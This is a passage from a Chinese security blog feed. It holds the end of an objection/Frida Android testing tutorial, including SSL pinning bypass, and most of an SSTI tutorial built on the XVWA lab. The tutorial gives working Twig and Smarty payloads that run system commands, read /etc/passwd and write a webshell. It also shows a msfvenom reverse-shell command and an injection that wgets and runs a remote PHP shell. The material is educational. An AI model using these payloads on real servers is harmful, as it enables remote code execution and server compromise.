0x200d2e is to class java.io.File</span><br><span class="line">Executing method: setExecutable()</span><br><span class="line">A Frida agent exception has occurred.</span><br><span class="line">Error: setExecutable(): argument count of 0 does not match any of:</span><br><span class="line">.overload(&#39;boolean&#39;)</span><br><span class="line">.overload(&#39;boolean&#39;, &#39;boolean&#39;)</span><br><span class="line">    at throwOverloadError (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:1020)</span><br><span class="line">    at n (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:667)</span><br><span class="line">    at &#x2F;script1.js:9147</span><br><span class="line">    at &#x2F;script1.js:9435</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;vm.js:11</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:279</span><br><span class="line">    at &#x2F;script1.js:9439</span><br><span class="line">    at &#x2F;script1.js:3011</span><br><span class="line">    at &#x2F;script1.js:9440</span><br></pre></td></tr></table></figure><h3 id="执行带参数函数"><a href="#执行带参数函数" class="headerlink" title="执行带参数函数"></a>执行带参数函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap evaluate &lt;Handle&gt;</span><br></pre></td></tr></table></figure><blockquote><p>执行之后会进入一个迷你的编辑器环境，之后输入我们想要执行的脚本内容，编辑完成后按回车键，即会开始执行这行脚本并输出结果。我们来使用File类的canWrite()函数和setWrite()函数进行测试，具体内容如下</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; ,clazz.canWrite())</span><br><span class="line">clazz.setWritable(false)</span><br><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; , clazz.canWrite())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android heap evaluate 0x200d2e</span><br><span class="line">(The handle at &#96;0x200d2e&#96; will be available as the &#96;clazz&#96; variable.)</span><br><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; ,clazz.canWrite())</span><br><span class="line">clazz.setWritable(false)</span><br><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; , clazz.canWrite())</span><br><span class="line">JavaScript capture complete. Evaluating...</span><br><span class="line">Handle 0x200d2e is to class java.io.File</span><br><span class="line">File is canWrite? &#x3D;&gt; true</span><br><span class="line">File is canWrite? &#x3D;&gt; false</span><br></pre></td></tr></table></figure><h3 id="查看内存中的so库"><a href="#查看内存中的so库" class="headerlink" title="查看内存中的so库"></a>查看内存中的so库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory list modules</span><br></pre></td></tr></table></figure><p>查看so库的导出(export)函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory list exports libssl.so</span><br></pre></td></tr></table></figure><p>将结果保存到json文件中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory list exports libart.so --json &#x2F;root&#x2F;libart.json</span><br></pre></td></tr></table></figure><h3 id="关闭SSLPINNING"><a href="#关闭SSLPINNING" class="headerlink" title="关闭SSLPINNING"></a>关闭SSLPINNING</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android sslpinning disable</span><br></pre></td></tr></table></figure><h2 id="objection远程连接"><a href="#objection远程连接" class="headerlink" title="objection远程连接"></a>objection远程连接</h2><p>frida 启动</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;fs -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><p>objection远程链接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objection -N -h 192.168.31.52 -p 8888 -g com.xxx.xxx explore</span><br></pre></td></tr></table></figure><h2 id="Obejction-Wallbreaker插件"><a href="#Obejction-Wallbreaker插件" class="headerlink" title="Obejction Wallbreaker插件"></a>Obejction Wallbreaker插件</h2><h3 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hluwa&#x2F;Wallbreaker ~&#x2F;.objection&#x2F;plugins&#x2F;Wallbreaker</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objection: objection -g com.app.name explore -P ~&#x2F;.objection&#x2F;plugins</span><br></pre></td></tr></table></figure><h3 id="搜索类"><a href="#搜索类" class="headerlink" title="搜索类"></a>搜索类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker classsearch &lt;pattern&gt;</span><br><span class="line">&#x2F;&#x2F;根据给的 pattern 对所有类名进行匹配，列出匹配到的所有类名。</span><br></pre></td></tr></table></figure><h3 id="搜索对象"><a href="#搜索对象" class="headerlink" title="搜索对象"></a>搜索对象</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker objectsearch &lt;classname&gt;</span><br><span class="line">&#x2F;&#x2F;根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果。</span><br></pre></td></tr></table></figure><h3 id="Classdump"><a href="#Classdump" class="headerlink" title="Classdump"></a>Classdump</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker classdump &lt;classname&gt; [--fullname]</span><br><span class="line">输出类的结构， 若加了 --fullname 参数，打印的数据中类名会带着完整的包名。</span><br></pre></td></tr></table></figure><h3 id="ObjectDump"><a href="#ObjectDump" class="headerlink" title="ObjectDump"></a>ObjectDump</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker objectdump &lt;handle&gt; [--fullname]</span><br><span class="line">在 ClassDump 的基础上，输出指定对象中的每个字段的数据。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;objection是一个基于Frida的动态的移动测试工具包，可以帮助我们来进行应用程序安全评估。&lt;/p&gt;
&lt;p&gt;主要由以下三个组件组成&lt;/p&gt;
&lt;p&gt;1.Frida-Gadget，以嵌入式模式运行应用，通过objection自己的api方法去调用frda执行我们想要的命令&lt;/p&gt;
&lt;p&gt;2.objeciton本身是由python编写的可以通过python实现一个交互式shell进行命令的加载和使用，以此来调用objection&lt;/p&gt;
&lt;p&gt;3.objection进行hook时会通过TypeScript独立生成一个agent.js文件，这样可以在使用中可以去直接调用所有的功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png&quot; alt=&quot;objection.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="objection" scheme="http://www.ol4three.com/tags/objection/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模版注入学习</title>
    <link href="http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-01-12T08:36:19.000Z</published>
    <updated>2022-02-22T07:16:10.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模版引擎"><a href="#模版引擎" class="headerlink" title="模版引擎"></a>模版引擎</h1><p>模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p><p>模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><h1 id="SSTI-模版注入"><a href="#SSTI-模版注入" class="headerlink" title="SSTI(模版注入)"></a>SSTI(模版注入)</h1><p>SSTI就是服务器端模版注入（Server-Side Template Injection）</p><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给Vier视图层，经过模版渲染展示给 用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未进过任何处理就将其作为Web应用模版的一部分，模版引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模版的语句，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>凡是使用模版的地方都可能会出现SSTI的问题，SSTI不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模版引擎发现了很大的安全漏洞，然后模版引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模块引擎。</p><h2 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png" alt="image-20220120174838082"></p><a id="more"></a><h1 id="PHP中的SSTI"><a href="#PHP中的SSTI" class="headerlink" title="PHP中的SSTI"></a>PHP中的SSTI</h1><p>php常见的模版：twig，smarty，blade</p><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p>Twig是来自于Symfony的模版引擎，他非常易于安装和使用。它的操作有点像Mustache和liquid</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#39;\twig\lib\Twig\Autoloader.php&#39;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig &#x3D; new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">　　$output &#x3D; $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; &#x3D;&gt; $_GET[&quot;name&quot;]));  &#x2F;&#x2F; 将用户输入作为模版变量的值</span><br><span class="line">　　echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p><p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p><p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p><p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125190409616.png" alt="image-20220125190409616"></p><p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig&#x3D;newTwig_Environment(newTwig_Loader_String());</span><br><span class="line">　　$output&#x3D;$twig-&gt;render(&quot;Hello &#123;$_GET[&#39;name&#39;]&#125;&quot;);&#x2F;&#x2F; 将用户输入作为模版内容的一部分</span><br><span class="line">　　echo $output;?&gt;</span><br></pre></td></tr></table></figure><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191148696.png" alt="image-20220125191148696"></p><p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p><p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p><p>例如这里用户输入name=20 ，则在服务端拼接的模版内容为:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191252096.png" alt="image-20220125191252096"></p><p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure><p>实际服务端要进行编译的模板就被构造为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure><p>由于  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK </p><p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207172609049.png" alt="image-20220207172609049"></p><p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p><p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p><p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p><p>接下来借助XVWA的代码来实践演示一下SSTI注入</p><p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&#123;$what&#125;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;div&gt;&#123;%$a%&#125;&lt;&#x2F;div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>xvwa源代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;thumbnail&quot;&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">        &lt;img class&#x3D;&quot;img-responsive&quot; src&#x3D;&quot;http:&#x2F;&#x2F;placehold.it&#x2F;800x300&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;caption-full&quot;&gt;</span><br><span class="line">        &lt;h4&gt;&lt;a href&#x3D;&quot;#&quot;&gt;Server Side Template Injection (SSTI)&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p align&#x3D;&quot;justify&quot;&gt;</span><br><span class="line">Web application uses templates to make the web pages look more dynamic. Template Injection occurs when user input is embedded in a template in an unsafe manner. However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise.          &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p&gt;Read more about Server Side Template Injection (SSTI)&lt;br&gt;</span><br><span class="line">        &lt;strong&gt;&lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;http:&#x2F;&#x2F;blog.portswigger.net&#x2F;2015&#x2F;08&#x2F;server-side-template-injection.html&quot;&gt;http:&#x2F;&#x2F;blog.portswigger.net&#x2F;2015&#x2F;08&#x2F;server-side-template-injection.html &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&lt;&#x2F;strong&gt;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;well&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;col-lg-6&quot;&gt; </span><br><span class="line">        &lt;p&gt;</span><br><span class="line">        Hint: &lt;br&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;Template Engine used is TWIG &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;Loader function used &#x3D; &quot;Twig_Loader_String &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;&lt;br&gt;</span><br><span class="line">        &lt;p&gt;Please Enter your Name.  </span><br><span class="line">            &lt;form method&#x3D;&#39;get&#39; action&#x3D;&#39;&#39;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;form-group&quot;&gt; </span><br><span class="line">                    &lt;label&gt;&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;input class&#x3D;&quot;form-control&quot; width&#x3D;&quot;50%&quot; placeholder&#x3D;&quot;Your Name&quot; name&#x3D;&quot;name&quot;&gt;&lt;&#x2F;input&gt; &lt;br&gt;</span><br><span class="line">                    &lt;div align&#x3D;&quot;right&quot;&gt; &lt;button class&#x3D;&quot;btn btn-default&quot; type&#x3D;&quot;submit&quot; name&#x3D;&#39;submit&#39;&gt;Submit Button&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;</span><br><span class="line">               &lt;&#x2F;div&gt; </span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                if (isset($_GET[&#39;submit&#39;])) &#123;</span><br><span class="line">                    $name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">                    &#x2F;&#x2F; include and register Twig auto-loader</span><br><span class="line">                    include &#39;vendor&#x2F;twig&#x2F;twig&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">                    Twig_Autoloader::register();</span><br><span class="line">                    try &#123;</span><br><span class="line">                          &#x2F;&#x2F; specify where to look for templates</span><br><span class="line">                              $loader &#x3D; new Twig_Loader_String();</span><br><span class="line">  </span><br><span class="line">                          &#x2F;&#x2F; initialize Twig environment</span><br><span class="line">                              $twig &#x3D; new Twig_Environment($loader);</span><br><span class="line">                         &#x2F;&#x2F; set template variables</span><br><span class="line">                         &#x2F;&#x2F; render template</span><br><span class="line">                            $result&#x3D; $twig-&gt;render($name);</span><br><span class="line">                            echo &quot;Hello $result&quot;;</span><br><span class="line">  </span><br><span class="line">                    &#125; catch (Exception $e) &#123;</span><br><span class="line">                          die (&#39;ERROR: &#39; . $e-&gt;getMessage());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php include_once(&#39;..&#x2F;..&#x2F;about.html&#39;); ?&gt;</span><br></pre></td></tr></table></figure><p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173353137.png" alt="image-20220207173353137"></p><p>根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于&#123;&#123;&#125;&#125; 的处理方式</p><p>在这里提供一个针对twig的攻击载荷：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173717250.png" alt="image-20220207173717250"></p><p>使用msf生成了一个php meterpreter有效载荷</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp -f raw LHOST&#x3D;172.20.10.2 LPORT&#x3D;4321 &gt; &#x2F;var&#x2F;tmp&#x2F;shell.txt</span><br></pre></td></tr></table></figure><p>msf进行监听：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207180708620.png" alt="image-20220207180708620"></p><p>模板注入远程下载shell，并重命名运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;wget http:&#x2F;&#x2F;172.20.10.2&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php;php -f &#x2F;tmp&#x2F;shell.php&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207181526053.png" alt="image-20220207181526053"></p><p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#x2F;etc&#x2F;passwd&#39;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#39;&#x2F;etc&#x2F;passwd&#39;,&#39;&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#39;cat &#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>具体payload分析详见：《<a href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p><p>　　　　　　　　　　 《<a href="https://my.oschina.net/u/4588149/blog/4408349">SSTI-服务器端模板注入</a>》</p><h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p><p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p><p>smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * gets  a stream variable</span><br><span class="line"> *</span><br><span class="line"> * @param  string $variable the stream of the variable</span><br><span class="line"> *</span><br><span class="line"> * @throws SmartyException</span><br><span class="line"> * @return mixed  the value of the stream variable</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function getStreamVariable($variable)</span><br><span class="line">&#123;</span><br><span class="line">    $_result &#x3D; &#39;&#39;;</span><br><span class="line">    $fp &#x3D; fopen($variable, &#39;r+&#39;);</span><br><span class="line">    if ($fp) &#123;</span><br><span class="line">        while (!feof($fp) &amp;&amp; ($current_line &#x3D; fgets($fp)) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">            $_result .&#x3D; $current_line;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        return $_result;</span><br><span class="line">    &#125;</span><br><span class="line">    $smarty &#x3D; isset($this-&gt;smarty) ? $this-&gt;smarty : $this;</span><br><span class="line">    if ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">        throw new SmartyException(&#39;Undefined stream variable &quot;&#39; . $variable . &#39;&quot;&#39;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以用这个方法来读取文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>同样在</p><p>smarty/libs/sysplugins/smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Smarty_Internal_Write_File</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Writes file in a safe way to disk</span><br><span class="line">     *</span><br><span class="line">     * @param  string $_filepath complete filepath</span><br><span class="line">     * @param  string $_contents file content</span><br><span class="line">     * @param  Smarty $smarty    smarty instance</span><br><span class="line">     *</span><br><span class="line">     * @throws SmartyException</span><br><span class="line">     * @return boolean true</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br><span class="line">    &#123;</span><br><span class="line">        $_error_reporting &#x3D; error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        if ($smarty-&gt;_file_perms !&#x3D;&#x3D; null) &#123;</span><br><span class="line">            $old_umask &#x3D; umask(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath &#x3D; dirname($_filepath);</span><br><span class="line">        &#x2F;&#x2F; if subdirs, create dir structure</span><br><span class="line">        if ($_dirpath !&#x3D;&#x3D; &#39;.&#39; &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms &#x3D;&#x3D;&#x3D; null ? 0777 : $smarty-&gt;_dir_perms, true);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; write to tmp file, then move to overt file lock race condition</span><br><span class="line">        $_tmp_file &#x3D; $_dirpath . DS . str_replace(array(&#39;.&#39;, &#39;,&#39;), &#39;_&#39;, uniqid(&#39;wrt&#39;, true));</span><br><span class="line">        if (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;*</span><br><span class="line">         * Windows&#39; rename() fails if the destination exists,</span><br><span class="line">         * Linux&#39; rename() properly handles the overwrite.</span><br><span class="line">         * Simply unlink()ing a file might cause other processes</span><br><span class="line">         * currently reading that file to fail, but linux&#39; rename()</span><br><span class="line">         * seems to be smart enough to handle that for us.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        if (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            &#x2F;&#x2F; remove original file</span><br><span class="line">            if (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; rename tmp file</span><br><span class="line">            $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; rename tmp file</span><br><span class="line">            $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">            if (!$success) &#123;</span><br><span class="line">                &#x2F;&#x2F; remove original file</span><br><span class="line">                if (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F; rename tmp file</span><br><span class="line">                $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($smarty-&gt;_file_perms !&#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F; set file permissions</span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span 